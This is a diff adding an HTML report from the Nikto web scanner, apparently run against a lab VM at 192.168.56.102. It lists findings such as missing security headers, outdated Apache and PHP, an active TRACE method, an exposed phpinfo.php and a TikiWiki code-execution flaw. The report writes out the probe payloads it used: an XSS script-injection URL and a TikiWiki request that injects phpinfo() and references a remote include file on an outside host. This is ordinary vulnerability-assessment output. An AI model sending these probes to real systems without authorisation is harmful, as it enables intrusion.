@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+ <title>Nikto Report</title>
+ <style type="text/css">
+  .dataTable
+  {
+   font-family: tahoma, sans-serif;
+   font-size: 11pt; 
+   font-weight: normal; 
+   color: #000066;
+   background: #EEEEEE;
+   border: thin solid black;
+   width: 95%;
+  }
+  .headerTable
+  {
+   font-family: tahoma, sans-serif;
+   font-size: 15pt; 
+   font-weight: normal; 
+   color: white;
+   background: #000066;
+   border: thin solid black;
+   width: 300px;
+  }
+  .column-head
+  {
+   width: 15em;
+   font-weight:bold;
+  }
+  .copyright
+  {
+   font-family: tahoma, sans-serif;
+   font-size: 10pt;
+   font-weight: normal;
+   font-style: italic;
+   color: black;
+  }
+  body
+  {
+   background: white;
+  }
+ </style>
+</head>
+<body>
+<div>
+<a name="1"></a>
+<table class="headerTable">
+ <tr>
+   <td>192.168.56.102 / 192.168.56.102 port 80</td>
+ </tr>
+</table>
+<table class="dataTable">
+ <tr>
+   <td class="column-head">Target IP</td>
+   <td>192.168.56.102</td>
+ </tr>
+ <tr>
+   <td class="column-head">Target hostname</td>
+   <td>192.168.56.102</td>
+ </tr>
+  <tr>
+   <td class="column-head">Target Port</td>
+   <td>80</td>
+ </tr>
+  <tr>
+   <td class="column-head">HTTP Server</td>
+   <td>Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch</td>
+ </tr>
+ <tr>
+   <td class="column-head">Site Link (Name)</td>
+   <td><a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a></td>
+ </tr>
+ <tr>
+   <td class="column-head">Site Link (IP)</td>
+   <td><a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a></td>
+ </tr>
+ </table>
+</div>
+<p></p>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>Server may leak inodes via ETags, header found with file /, inode: 67575, size: 45, mtime: Wed Mar 17 10:08:25 2010</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a><br>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>The anti-clickjacking X-Frame-Options header is not present.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a><br>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a><br>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a><br>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>HEAD</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>PHP/5.2.4-2ubuntu5.10 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a><br>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>HEAD</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a><br>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/index</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>Uncommon header 'tcn' found, with contents: list</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/index">http://192.168.56.102:80/index</a><br>
+      <a href="http://192.168.56.102:80/index">http://192.168.56.102:80/index</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/index</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/index">http://192.168.56.102:80/index</a><br>
+      <a href="http://192.168.56.102:80/index">http://192.168.56.102:80/index</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>OPTIONS</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE </td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a><br>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>TRACE</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>HTTP TRACE method is active, suggesting the host is vulnerable to XST</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a><br>
+      <a href="http://192.168.56.102:80/">http://192.168.56.102:80/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/877" title="More vulnerability information on OSVDB.org">OSVDB-877</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;">http://192.168.56.102:80/phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</a><br>
+      <a href="http://192.168.56.102:80/phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;">http://192.168.56.102:80/phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/phpinfo.php: Output from the phpinfo() function was found.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;">http://192.168.56.102:80/phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</a><br>
+      <a href="http://192.168.56.102:80/phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;">http://192.168.56.102:80/phpinfo.php?VARIABLE=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/phpinfo.php</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/phpinfo.php">http://192.168.56.102:80/phpinfo.php</a><br>
+      <a href="http://192.168.56.102:80/phpinfo.php">http://192.168.56.102:80/phpinfo.php</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/3233" title="More vulnerability information on OSVDB.org">OSVDB-3233</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/icons/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/icons/: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/icons/">http://192.168.56.102:80/icons/</a><br>
+      <a href="http://192.168.56.102:80/icons/">http://192.168.56.102:80/icons/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/3268" title="More vulnerability information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/icons/README</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/icons/README: Apache default file found.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/icons/README">http://192.168.56.102:80/icons/README</a><br>
+      <a href="http://192.168.56.102:80/icons/README">http://192.168.56.102:80/icons/README</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/3233" title="More vulnerability information on OSVDB.org">OSVDB-3233</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>Cookie PHPSESSID created without the httponly flag</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?">http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?</a><br>
+      <a href="http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?">http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/tikiwiki/tiki-graph_formula.php: Output from the phpinfo() function was found.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?">http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?</a><br>
+      <a href="http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?">http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/0" title="More vulnerability information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?: TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Test Links</td>
+    <td>
+      <a href="http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?">http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?</a><br>
+      <a href="http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?">http://192.168.56.102:80/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head">OSVDB Entries</td>
+    <td>
+      <a href="http://osvdb.org/40478" title="More vulnerability information on OSVDB.org">OSVDB-40478</a>
+    </td>
+</table>
+
+<div>
+<p></p>
+<table class="headerTable">
+ <tr>
+  <td>Host Summary</td>
+ </tr>
+</table>
+<table  class="dataTable">
+ <tr>
+  <td class="column-head">Start Time</td>
+  <td>2020-10-31 06:52:48</td>
+ </tr>
+ <tr>
+  <td class="column-head">End Time</td>
+  <td>2020-10-31 06:53:49</td>
+ </tr>
+ <tr>
+  <td class="column-head">Elapsed Time</td>
+  <td>61 seconds</td>
+ </tr>
+ <tr>
+  <td class="column-head">Statistics</td>
+  <td>8725 requests, 1 errors, 18 findings</td>
+ </tr>
+</table>
+</div>
+<p></p>
+
+<p></p>
+<table class="headerTable">
+  <tr>
+    <td>Scan Summary</td>
+  </tr>
+</table>
+<table class="dataTable">
+  <tr>
+    <td class="column-head">Software Details</td>
+    <td><a href="http://cirt.net/">Nikto 2.1.6</a></td>
+  <tr>
+    <td class="column-head">CLI Options</td>
+    <td>-o rept_102.html -h 192.168.56.102</td>
+  </tr>
+  <tr>
+    <td class="column-head">Hosts Tested</td>
+    <td>1</td>
+  </tr>
+  <tr>
+    <td class="column-head">Start Time</td>
+    <td>Sat Oct 31 06:52:46 2020</td>
+  </tr>
+  <tr>
+    <td class="column-head">End Time</td>
+    <td>Sat Oct 31 06:53:49 2020</td>
+  </tr>
+  <tr>
+    <td class="column-head">Elapsed Time</td>
+    <td>63 seconds</td>
+  </tr>
+</table>
+<p></p>
+<p class="copyright">&copy; 2008 Chris Sullo</p>
+
+<!-- (c) 2008 Chris Sullo -->
+
+</body>
+</html>
+
